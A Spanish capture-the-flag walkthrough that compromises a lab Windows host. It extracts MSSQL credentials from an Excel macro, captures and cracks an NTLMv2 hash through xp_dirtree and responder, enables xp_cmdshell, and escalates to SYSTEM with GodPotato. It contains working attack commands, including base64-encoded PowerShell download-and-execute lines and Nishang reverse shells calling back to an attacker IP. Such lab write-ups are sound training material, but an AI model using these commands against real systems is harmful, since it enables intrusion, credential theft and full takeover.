SIN CREDENCIALES — Macro filtrada en un Excel

Se listan los shares SMB accesibles de forma anónima.

listado de shares
smbclient -N -L //10.129.51.236/
Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Reports Disk

El share Reports contiene un único fichero, Currency Volume Report.xlsm, que se descarga.

descarga del fichero
smbclient -N //10.129.51.236/Reports smb: \> get "Currency Volume Report.xlsm"
Extensión con macros
La m extra en .xlsm (frente al .xlsx normal) indica que el fichero contiene macros. Se extraen con olevba.
extracción de macros
olevba "Currency Volume Report.xlsm"
Private Sub Connect() Dim conn As ADODB.Connection Dim rs As ADODB.Recordset Set conn = New ADODB.Connection conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no; Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6" conn.ConnectionTimeout = 10 conn.Open ...
Credenciales de MSSQL en la macro
La macro, pensada para conectar automáticamente a la base de datos, deja en texto claro las credenciales reporting:PcwTWTHRwryjc$c6.
// 03

MSSQL — xp_dirtree y captura NTLMv2

Con las credenciales de la macro se accede al motor MSSQL.

acceso a mssql
impacket-mssqlclient 'reporting':'PcwTWTHRwryjc$c6'@'10.129.51.236' -windows-auth

El usuario reporting no tiene privilegios elevados, pero sí puede ejecutar xp_dirtree. Buscando manualmente en el filesystem no se encuentra nada de interés, así que se fuerza al motor SQL a autenticarse contra un host propio para capturar su hash NTLMv2, con responder en escucha.

responder en escucha
sudo responder -I tun0 -wv
forzando la autenticación desde mssql
xp_dirtree \\10.10.15.51\loquesea
Hash NTLMv2 de mssql-svc capturado
responder captura el hash NTLMv2 de la cuenta de servicio mssql-svc. Se crackea con hashcat y la contraseña resulta ser corporate568.

Se vuelve a conectar a MSSQL, esta vez como mssql-svc. Esta cuenta sí tiene permisos para habilitar xp_cmdshell, que viene deshabilitado por defecto.

habilitar xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

Con xp_cmdshell activo ya se pueden ejecutar comandos del sistema y leer la flag de usuario.

lectura de la flag
xp_cmdshell "more C:\Users\mssql-svc\Desktop\user.txt"
USER FLAG aa412c7ec834160da5a7be39882f8483
// 04

REVERSE SHELL — xp_cmdshell + Nishang

Para operar cómodamente se consigue una reverse shell interactiva usando el script Invoke-PowerShellTcp.ps1 de Nishang.

preparación del script
git clone https://github.com/samratashok/nishang cp nishang/Shells/Invoke-PowerShellTcp.ps1 . echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.51 -Port 4444" >> Invoke-PowerShellTcp.ps1

Se sirve por HTTP y se descarga en memoria desde xp_cmdshell, codificado en base64 para evitar problemas de comillas.

codificación y ejecución
echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.51/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w 0
xp_cmdshell "powershell -ep bypass -enc <BASE64>"

Con un servidor Python sirviendo el script y un listener en el puerto elegido, se recibe la shell como mssql-svc.

// 05

GODPOTATO — Abuso de SeImpersonatePrivilege

Ya con shell interactiva, se revisan los privilegios del usuario.

privilegios del usuario
whoami /all
Privilege Name Description State ============================= ============================================== ======== SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled
SeImpersonatePrivilege activo
Con este privilegio se puede abusar de un servicio COM local (vía GodPotato) para obtener un token de NT AUTHORITY\SYSTEM.

Se descarga GodPotato en la máquina objetivo y se lanza para ejecutar una segunda reverse shell con privilegios de sistema.

1. descarga de godpotato
powershell -ep bypass wget http://10.10.15.51/GodPotato-NET4.exe -OutFile C:\Users\Public\gp.exe

Se prepara una segunda shell de Nishang en otro puerto (5555) y se codifica igual que antes.

2. segunda shell codificada
cp nishang/Shells/Invoke-PowerShellTcp.ps1 shell2.ps1 echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.51 -Port 5555" >> shell2.ps1 echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.51/shell2.ps1')" | iconv -t UTF-16LE | base64 -w 0

Se ejecuta GodPotato indicándole el comando que debe lanzar con privilegios de SYSTEM.

3. ejecución de godpotato
C:\Users\Public\gp.exe -cmd "powershell -ep bypass -enc <BASE64>"

Con un listener nuevo en el puerto 5555, llega la shell como nt authority\system.

lectura de la flag de administrador
type C:\Users\Administrator\Desktop\root.txt
ADMIN FLAG fb2ba999a1465554a5156834055b4e29
